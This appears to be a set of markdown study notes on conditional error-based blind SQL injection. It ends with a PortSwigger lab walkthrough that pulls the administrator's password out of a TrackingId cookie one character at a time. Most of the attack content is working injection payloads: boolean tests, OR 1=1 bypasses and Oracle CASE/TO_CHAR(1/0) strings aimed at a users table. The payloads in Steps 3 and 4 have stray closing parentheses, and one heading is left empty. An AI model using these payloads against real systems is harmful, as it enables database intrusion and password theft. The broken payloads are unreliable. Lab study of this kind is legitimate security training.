# 🔐 SQL Injection — Conditional Error-Based

## 📚 Topic
Blind SQL Injection — Conditional Error Technique

---

# 🎯 Objective

Learn how attackers extract sensitive data when:

- Application does not display query results
- Page response does not visibly change
- Database errors are visible

Attackers intentionally trigger **database errors** to infer information.

---

# 🧠 Pentester Workflow

A professional SQL injection workflow:

```
1 Detect SQL Injection
2 Identify Database Type
3 Confirm error behavior
4 Use DB-specific syntax
5 Extract data
```

---

# 1️⃣ Detect SQL Injection

Basic injection test:

```
'
```

Possible server responses:

```
SQL syntax error
Database error
Unclosed quotation mark
```

Boolean confirmation:

```sql
' AND 1=1-- -
' AND 1=2-- -
```

Observation:

| Payload | Result |
|------|------|
AND 1=1 | Normal page |
AND 1=2 | Different response |

# 💬 SQL Comment Syntax

Comments ignore the rest of the query.

| DBMS | Comment |
|------|--------|
MySQL | `-- ` or `#` |
PostgreSQL | `-- ` |
Oracle | `-- ` |
MSSQL | `-- ` |

Example:

```sql
' OR 1=1-- -
```

Original query:

```sql
SELECT * FROM users WHERE username='admin'
```

Injected query becomes:

```sql
SELECT * FROM users WHERE username='' OR 1=1-- -
```

# 2️⃣ Identify Database Type

SQL syntax differs between databases.

| Database | Example Test |
|------|------|
MySQL | `SELECT @@version` |
PostgreSQL | `SELECT version()` |
Oracle | `SELECT * FROM dual` |

Oracle uses a dummy table:

```
DUAL
```

---

# 3️⃣ Conditional Error SQL Injection Concept

Error triggered only when condition is TRUE.

```
TRUE → database error
FALSE → normal response
```

This behavior allows attackers to extract information.

---

# ⚙️ CASE Statement

```sql
CASE
WHEN condition
THEN result
ELSE result
END
```

Example:

```sql
CASE
WHEN 1=1
THEN 'true'
ELSE 'false'
END
```

Common error trigger:

```sql
1/0
```

```
Database error
```

### TRUE condition

# ⚠️ Database Syntax Differences

| Feature | MySQL | Oracle |
|------|------|------|
Substring | SUBSTRING() | SUBSTR() |
Dummy table | not required | DUAL |
String concat | CONCAT() | `||` |

Example Oracle payload:

```sql
xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

Explanation:

```
|| → string concatenation
TO_CHAR(1/0) → division error
DUAL → Oracle dummy table
```

# 🎯 PortSwigger Lab — Conditional Error SQLi

Goal:

Extract password of **administrator** using injection in **TrackingId cookie**.

---

# 🧪 Lab Exploitation Steps

### Step 1 — Confirm Error Injection

```sql
xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

Expected result:

```
Server error
```

---

### Step 2 — Check If User Exists

```sql
xyz'||(SELECT CASE WHEN (username='administrator') THEN TO_CHAR(1/0) ELSE '' END FROM users)||'
```

If error appears → user exists.

---

### Step 3 — Find Password Length

Example test:

```sql
xyz'||(SELECT CASE WHEN LENGTH(password)=20) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

Observation:

| Result | Meaning |
|------|------|
Error | length correct |
Normal | try another length |

---

### Step 4 — Extract Characters

Example:

```sql
xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

Logic:

```
If first character = a
→ division by zero error
```

Repeat:

```
SUBSTR(password,2,1)
SUBSTR(password,3,1)
SUBSTR(password,4,1)
```
